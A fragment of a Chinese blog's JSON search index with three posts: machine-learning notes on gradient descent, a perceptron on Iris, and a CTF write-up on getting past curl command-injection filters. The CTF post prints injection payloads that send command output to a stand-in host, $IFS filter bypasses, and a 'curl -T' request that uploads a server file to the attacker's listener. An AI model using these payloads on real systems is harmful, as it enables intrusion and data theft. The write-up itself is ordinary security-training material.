src=\"/2017/04/08/吴恩达机器学习笔记-一/notation.png\"></p>\n<h4 id=\"梯度下降算法\"><a href=\"#梯度下降算法\" class=\"headerlink\" title=\"梯度下降算法\"></a>梯度下降算法</h4><p>使用梯度下降算法寻找使得代价函数$J(\\theta_0, \\theta_1)$取得最小值时的解, 即$\\theta_0, \\theta_1$的值。</p>\n<p>梯度下降算法不断重复下面过程，直到收敛<br><img src=\"/2017/04/08/吴恩达机器学习笔记-一/theta.png\"><br><img src=\"/2017/04/08/吴恩达机器学习笔记-一/theta2.png\"><br><img src=\"/2017/04/08/吴恩达机器学习笔记-一/theta1.png\"><br>其中$j=0,1$, $\\alpha$表示学习速率, 它控制我们以多大的幅度更新这个参数$\\theta_j$; 每次迭代都必须<code>同时更新</code>$\\theta_0, \\theta_1$参数。</p>\n<h2 id=\"第二周\"><a href=\"#第二周\" class=\"headerlink\" title=\"第二周\"></a>第二周</h2><h3 id=\"多变量线性回归\"><a href=\"#多变量线性回归\" class=\"headerlink\" title=\"多变量线性回归\"></a>多变量线性回归</h3><p>多特征 <script type=\"math/tex\">h_{\\theta}(x) = \\theta_0 + \\theta_1x_1 + \\theta_2x_2 + \\ldots + \\theta_nx_n</script></p>\n<p>其中<script type=\"math/tex\">n=|x^{(i)}|</script>,表示样本的特征数。令$x_0=1$, 有<br><img src=\"/2017/04/08/吴恩达机器学习笔记-一/mx.png\"></p>\n<p>当只有3个样本,每个样本1个特征，可以如下图表示:<br><img src=\"/2017/04/08/吴恩达机器学习笔记-一/mx1.png\"></p>\n<h3 id=\"多变量梯度下降算法\"><a href=\"#多变量梯度下降算法\" class=\"headerlink\" title=\"多变量梯度下降算法\"></a>多变量梯度下降算法</h3><img src=\"/2017/04/08/吴恩达机器学习笔记-一/thetamx.png\">\n<h4 id=\"特征缩放\"><a href=\"#特征缩放\" class=\"headerlink\" title=\"特征缩放\"></a>特征缩放</h4><p>样本的所有特征在相似的范围时，梯度下降算法有更快的收敛速度。<br>改变输入变量的范围，使其满足所有特征在相似的范围，通常情况为: <script type=\"math/tex\">−1 ≤ x_{(i)} ≤ 1</script> or <script type=\"math/tex\">−0.5 ≤ x_{(i)} ≤ 0.5</script>。一般采用均值归一化实现特征缩放。<br><img src=\"/2017/04/08/吴恩达机器学习笔记-一/mean.png\"><br>其中，$u_i$表示特征$(i)$的均值，$s_i$ 通常为 特征$(i)$中(最大值 - 最小值) 或者 特征$(i)$的标准差，一般使用(最大值 - 最小值)就可以满足了。</p>\n<h4 id=\"学习速率-alpha\"><a href=\"#学习速率-alpha\" class=\"headerlink\" title=\"学习速率$\\alpha$\"></a>学习速率$\\alpha$</h4><p>学习速率$\\alpha$影响代价函数收敛的速度，$\\alpha$过小会导致收敛很慢，$\\alpha$太大又会导致不收敛。</p>\n<h3 id=\"多项式回归\"><a href=\"#多项式回归\" class=\"headerlink\" title=\"多项式回归\"></a>多项式回归</h3><p>多项式回归能够使用线性回归的方法来拟合非常复杂的函数，甚至是非线性函数。其主要思想是变量替换。<br>如<script type=\"math/tex\">h_\\theta(x) = \\theta_0 + \\theta_1x_1 + \\theta_2x_1^2 + \\theta_3x_1^3</script>,<br>令 <script type=\"math/tex\">x_2=x_1^2, x_3=x_1^3</script>,<br>则 <script type=\"math/tex\">h_\\theta(x) = \\theta_0 + \\theta_1x_1 + \\theta_2x_2 + \\theta_3x_3</script>。</p>\n<h3 id=\"标准方程\"><a href=\"#标准方程\" class=\"headerlink\" title=\"标准方程\"></a>标准方程</h3><p>标准方程提供了一种求解$\\theta$的解析解法。</p>\n<h4 id=\"设计矩阵X\"><a href=\"#设计矩阵X\" class=\"headerlink\" title=\"设计矩阵X\"></a>设计矩阵X</h4><p>具有n个特征的训练样本集(样本数量为m)，构造设计矩阵$X$, $X$为 m*(n+1) 的矩阵<br><img src=\"/2017/04/08/吴恩达机器学习笔记-一/designmatrix.png\"></p>\n<p>求解$\\theta$, <script type=\"math/tex\">\\theta=(X^TX)^{-1}X^Ty</script>。<br><img src=\"/2017/04/08/吴恩达机器学习笔记-一/exp.png\"></p>\n<h4 id=\"梯度下降算法和标准方程对比\"><a href=\"#梯度下降算法和标准方程对比\" class=\"headerlink\" title=\"梯度下降算法和标准方程对比\"></a>梯度下降算法和标准方程对比</h4><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Gradient Descent</th>\n<th>Normal Equation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Need to choose alpha</td>\n<td>No need to choose alpha</td>\n</tr>\n<tr>\n<td>Needs many iterations</td>\n<td>No need to iterate</td>\n</tr>\n<tr>\n<td><script type=\"math/tex\">\\Theta(kn^2)</script></td>\n<td><script type=\"math/tex\">\\Theta(n^3)</script>, need to calculate inverse of <script type=\"math/tex\">X^TX</script></td>\n</tr>\n<tr>\n<td>Works well when n is large</td>\n<td>Slow if n is very large</td>\n</tr>\n</tbody>\n</table>\n</div>\n","categories":["机器学习"],"tags":["线性回归"]},{"title":"绕过curl命令执行过滤","url":"http://www.beesfun.com/2017/04/08/绕过curl命令执行过滤/","content":"<h2 id=\"常见命令执行\"><a href=\"#常见命令执行\" class=\"headerlink\" title=\"常见命令执行\"></a>常见命令执行</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system(<span class=\"string\">\"curl $cmd\"</span>);</span><br></pre></td></tr></table></figure>\n<p>用上面php代码为例, 存在命令执行，由于没有回显，需要自己搭建服务器接收数据，这里就不过多叙述。常用命令执行有: <code>` </code>, <code>$()</code>, 如:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl vps.com/`whoami`</span><br><span class=\"line\">curl vps.com/$(whoami)</span><br><span class=\"line\"></span><br><span class=\"line\"># IFS绕过空格</span><br><span class=\"line\">curl$IFSvps.com/$(whoami)</span><br><span class=\"line\">curl$&#123;IFS&#125;vps.com/$(whoami)</span><br><span class=\"line\"></span><br><span class=\"line\"># base64 编码绕过空格或特殊字符过滤</span><br><span class=\"line\">curl vps.com/$(id|base64)</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"CTF实例\"><a href=\"#CTF实例\" class=\"headerlink\" title=\"CTF实例\"></a>CTF实例</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">strreplace</span><span class=\"params\">($str)</span></span>&#123;</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'`'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">';'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'|'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'&amp;'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'&gt;'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'&lt;'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'('</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">')'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'&#123;'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'&#125;'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'%'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'#'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'!'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'?'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'@'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'+'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">'/'</span>,<span class=\"string\">''</span>,$str); <span class=\"comment\">//这句是为了保证服务器安全的,防止利用../ 和 绝对路径 进行任意文件读取,与次题目解答无关</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    $str = str_replace(<span class=\"string\">':'</span>,<span class=\"string\">''</span>,$str);  <span class=\"comment\">//添加这一句</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> $str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_GET[<span class=\"string\">'num'</span>]&lt;&gt;<span class=\"string\">\"\"</span>)&#123;</span><br><span class=\"line\">    $num = $_GET[<span class=\"string\">'num'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($num,<span class=\"string\">'1'</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"Sorry\"</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">elseif</span>($num &lt;&gt; <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Try to num = 1\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($num == <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Flag in http://127.0.0.1/flag.php\"</span>.<span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">        $cmd=trim($_GET[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">        $cmd=strreplace($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">        system(<span class=\"string\">\"curl$cmd/flag.php\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"It Works!\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><h4 id=\"num参数判断\"><a href=\"#num参数判断\" class=\"headerlink\" title=\"num参数判断\"></a>num参数判断</h4><p>get传递的num参数需要==1，但是又经过strstr()函数，即num中不能存在1，这里利用php特性，0.99999999999999就会产生小数下标溢出为1，即可绕过第一步；</p>\n<h4 id=\"cmd参数过滤\"><a href=\"#cmd参数过滤\" class=\"headerlink\" title=\"cmd参数过滤\"></a>cmd参数过滤</h4><p><code>curl$cmd/flag.php</code>，curl紧贴cmd参数，中间没有空格</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">trim()函数过滤了cmd两端的空格，可以用 $IFS 绕过，</span><br><span class=\"line\">经过strreplace()函数，将一部分符号过滤掉了，并未过滤 $ ;</span><br></pre></td></tr></table></figure>\n<p><code>%</code>过滤了，不能利用<code>%0a</code>换行符来绕过；<code>;</code>分号，<code>&amp;</code>逻辑与，<code>|</code>逻辑或，都过滤掉了。</p>\n<h4 id=\"读flag内容\"><a href=\"#读flag内容\" class=\"headerlink\" title=\"读flag内容\"></a>读flag内容</h4><ul>\n<li>利用 <code>file</code>协议</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.1.101/index.php?num=0.99999999999999999999&amp;cmd=$IFSfile:///$PWD</span><br></pre></td></tr></table></figure>\n<p>file协议常见格式如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># *nix</span><br><span class=\"line\">file://localhost/etc/fstab</span><br><span class=\"line\">file:///etc/fstab</span><br><span class=\"line\"></span><br><span class=\"line\"># windows</span><br><span class=\"line\">file://localhost/c|/WINDOWS/clock.avi</span><br><span class=\"line\">file:///c|/WINDOWS/clock.avi</span><br><span class=\"line\">file://localhost/c:/WINDOWS/clock.avi</span><br><span class=\"line\"># Here is the URI as understood by the Windows Shell API</span><br><span class=\"line\">file:///c:/WINDOWS/clock.avi</span><br><span class=\"line\"></span><br><span class=\"line\"># network location:</span><br><span class=\"line\"></span><br><span class=\"line\">file://hostname/path/to/file.txt</span><br></pre></td></tr></table></figure>\n<p>另外：<code>$PWD</code>要大写，因为在PHP中内核常量必须要求大写；php中<code>file协议</code>读取出来的文件内容会放到网页源代码中，右键查看源代码即可看到内容。</p>\n<p>但是这种方式不适合本题, 题目过滤了<code>/</code>。</p>\n<ul>\n<li>curl -T 上传文件到主机并通过监听来获取文件内容</li>\n</ul>\n<p>curl不仅仅可以下载文件，还可以上传文件，通过内置<code>option -T</code>来实现, 这就可以利用curl的这个功能来将文件PUT上传给我们的主机，由于PUT method是HTTP的，所以主机需要支持web服务，然后带上端口, 由于题目过滤了<code>:</code>，于是只能使用80端口了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.1.101/index.php?num=0.99999999999999999999&amp;cmd=$IFS-T flag.php -a your_vps_ip</span><br></pre></td></tr></table></figure>\n<p>然后再vps上监听80端口<code>nc -lvv 80</code>，即可拿到文件内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@iZbyhbtw2xco3tZ:~# nc -lvv 80</span><br><span class=\"line\">Listening on [0.0.0.0] (family 0, port 80)</span><br><span class=\"line\">Connection from [121.194.2.43] port 80 [tcp/http] accepted (family 2, sport 40156)</span><br><span class=\"line\">PUT /flag.php HTTP/1.1</span><br><span class=\"line\">User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.21 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2</span><br><span class=\"line\">Host: 120.25.91.96</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Content-Length: 91</span><br><span class=\"line\">Expect: 100-continue</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">die(&quot;小样,还想偷看flag!&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$flag=&quot;flag&#123;0fNcf32079b7L6e71021d8Qcd70e32lp&#125;&quot;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>IFS变量，IFS是internal field separator的缩写，shell的特殊环境变量。ksh根据IFS存储的值，可以是空格、tab、换行符或者其他自定义符号，来解析输入和输出的变量值</p>\n","categories":["CTF"],"tags":["curl","命令执行"]},{"title":"Iris数据集训练感知机模型","url":"http://www.beesfun.com/2017/04/07/Iris数据集训练感知机模型/","content":"<h2 id=\"感知机\"><a href=\"#感知机\" class=\"headerlink\" title=\"感知机\"></a>感知机</h2><p>基于MCP神经元模型，Frank Rosenblatt发表了第一个感知机学习规则(F.Rosenblatt, <strong>The Perceptron, a Perceiving and Recognizing Automaton.</strong> Cornell Aeronautical Laboratory, 1957)。<br>基于此感知机规则，Rosenblatt提出了能够自动学习最优权重参数的算法，权重即输入特征的系数。在监督学习和分类任务语境中，上面提到的算法还能够用于预测一个样本是属于类别A还是类别B。</p>\n<p>更准确的描述是，我们可以将上面提到的样本属于哪一个类别这个问题称之为二分类问题(binary classification task),我们将其中涉及到的两个类别记作1(表示正类)和-1(表示负类)。我们再定义一个称为激活函数(activation function) $\\phi(z)$，激活函数接收一个输入向量$x$和相应的权重向量$w$的线性组合，其中$z$也被称为网络输入 $z=w_1x_1+\\ldots+w_mx_m$ :</p>\n<a id=\"more\"></a>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/wx.png\">\n<p>此时，如果某个样本$x^{(i)}$的激活值，即$\\phi(z)$大于事先设置的阈值$\\theta$,我们就说样本$x^{(i)}$属于类别1，否则属于类别-1。</p>\n<p>在感知机学习算法中，激活函数$\\phi(z)$的形式非常简单，仅仅是一个单位阶跃函数(也被称为Heaviside阶跃函数):</p>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/phi_z_1.png\">\n<p>为了推导简单，我们可以将阈值$\\theta$挪到等式左边并且额外定义一个权重参数$w_0=-\\theta$, 这样我们可以对$z$给出更加紧凑的公式$z=w_0x_0+w_1x_1+…+w_mx_m=w^Tx$，此时</p>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/phi_z_2.png\">\n<p>下面左图描述了感知机的激活函数怎样将网络输入$z=w^Tx$压缩到二元输出(-1,1)，右图描述了感知机如何区分两个线性可分的类别。</p>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/pic1.png\">\n<p>不论MCP神经元还是Rosenblatt的阈值感知机模型，他们背后的idea都是试图使用简单的方法来模拟大脑中单个神经元的工作方式：要么传递信号要么不传递。因此，Rosenblatt最初的感知机规则非常简单，步骤如下：</p>\n<ul>\n<li>将权重参数初始化为0或者很小的随机数。</li>\n<li>对于每一个训练集样本$x^{(i)}$,执行下面的步骤：<ul>\n<li>计数输出值 $\\hat{y}$.</li>\n<li>更新权重参数.</li>\n</ul>\n</li>\n</ul>\n<p>此处的输出值就是单位阶跃函数预测的类别(1,-1)，参数向量$w$中的每个$w_j$的更新过程可以用数学语言表示为：</p>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/pic2.png\">\n<p>其中 $\\Delta w_j$，用于更新权重$w_j$,在感知机算法中的计算公式为:</p>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/pic3.png\">\n<p>其中$\\eta$ 称为学习率(learning rate), 是一个介于0.0和1.0之间的常数，$y^{(i)}$是第i个训练样本的真实类别，$\\hat{y}^{(i)}$是对第i个训练样本的预测类别。 <strong>权重向量中的每一个参数 $w_j$ 是同时被更新的</strong>，这意味着在所有的 $\\Delta w_j$计算出来以前不会重新计算 $\\hat{y}^{(i)}$。具体地，对于一个二维数据集，我们可以将更新过程写为：</p>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/pic4.png\">\n<p><strong>感知机算法仅在两个类别确实线性可分并且学习率充分小的情况下才能保证收敛</strong>。如果两个类别不能被一个线性决策界分开，我们可以设置最大训练集迭代次数(epoch)或者可容忍的错误分类样本数 来停止算法的学习过程。</p>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/pic5.png\">\n<p>在进入下一节的代码实现之前，我们来总结一下感知机的要点：</p>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/pic6.png\">\n<p>感知机接收一个样本输入x，然后将其和权重w结合，计算网络输入z。z接着被传递给激活函数，产生一个二分类输出-1或1作为预测的样本类别。在整个学习阶段，输出用于计算预测错误率(y-$\\hat{y}$)和更新权重参数。</p>\n<h2 id=\"python-实现感知机算法\"><a href=\"#python-实现感知机算法\" class=\"headerlink\" title=\"python 实现感知机算法\"></a>python 实现感知机算法</h2><ul>\n<li>perceptron.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">@author: janes</span></span><br><span class=\"line\"><span class=\"string\">@file: perceptron.py</span></span><br><span class=\"line\"><span class=\"string\">@time: 2017/4/7 13:45</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Perceptron</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"Perceptron classifier.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Parameters</span></span><br><span class=\"line\"><span class=\"string\">    ------------</span></span><br><span class=\"line\"><span class=\"string\">    eta:float</span></span><br><span class=\"line\"><span class=\"string\">        Learning rate (between 0.0 and 1.0)</span></span><br><span class=\"line\"><span class=\"string\">    n_iter:int</span></span><br><span class=\"line\"><span class=\"string\">        Passes over the training dataset.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Attributes</span></span><br><span class=\"line\"><span class=\"string\">    -------------</span></span><br><span class=\"line\"><span class=\"string\">    w_: 1d-array</span></span><br><span class=\"line\"><span class=\"string\">        Weights after fitting.</span></span><br><span class=\"line\"><span class=\"string\">    errors_: list</span></span><br><span class=\"line\"><span class=\"string\">        Numebr of misclassifications in every epoch.</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, eta=<span class=\"number\">0.01</span>, n_iter=<span class=\"number\">10</span>)</span>:</span></span><br><span class=\"line\">        self.eta = eta</span><br><span class=\"line\">        self.n_iter = n_iter</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fit</span><span class=\"params\">(self, X, y)</span>:</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"Fit training data.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        Parameters</span></span><br><span class=\"line\"><span class=\"string\">        ------------</span></span><br><span class=\"line\"><span class=\"string\">        X: &#123;array-like&#125;, shape=[n_samples, n_features]</span></span><br><span class=\"line\"><span class=\"string\">            Training vectors, where n_samples is the number of samples</span></span><br><span class=\"line\"><span class=\"string\">            and n_featuers is the number of features.</span></span><br><span class=\"line\"><span class=\"string\">        y: array-like, shape=[n_smaples]</span></span><br><span class=\"line\"><span class=\"string\">            Target values.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        Returns</span></span><br><span class=\"line\"><span class=\"string\">        ----------</span></span><br><span class=\"line\"><span class=\"string\">        self: object</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Add w_0</span></span><br><span class=\"line\">        self.w_ = np.zeros(<span class=\"number\">1</span> + X.shape[<span class=\"number\">1</span>])</span><br><span class=\"line\">        self.errors_ = []</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> range(self.n_iter):</span><br><span class=\"line\">            errors = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> xi, target <span class=\"keyword\">in</span> zip(X, y):</span><br><span class=\"line\">                update = self.eta * (target - self.predict(xi))</span><br><span class=\"line\">                self.w_[<span class=\"number\">1</span>:] += update * xi</span><br><span class=\"line\">                self.w_[<span class=\"number\">0</span>] += update</span><br><span class=\"line\">                errors += int(update != <span class=\"number\">0.0</span>)</span><br><span class=\"line\">            self.errors_.append(errors)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">net_input</span><span class=\"params\">(self, X)</span>:</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"Calculate net input\"\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> np.dot(X, self.w_[<span class=\"number\">1</span>:]) + self.w_[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">predict</span><span class=\"params\">(self, X)</span>:</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"Return class label after unit step\"\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> np.where(self.net_input(X) &gt;= <span class=\"number\">0.0</span>, <span class=\"number\">1</span>, <span class=\"number\">-1</span>)</span><br></pre></td></tr></table></figure>\n<p>初始化一个新的Perceptron对象，并且对学习率eta和迭代次数n_iter赋值，fit方法先对权重参数初始化，然后对训练集中每一个样本循环，根据感知机算法对权重进行更新。类别通过predict方法进行预测。除此之外，self.errors_ 还记录了每一轮中误分类的样本数，有助于接下来我们分析感知机的训练过程。</p>\n<h2 id=\"Iris数据集训练感知机算法\"><a 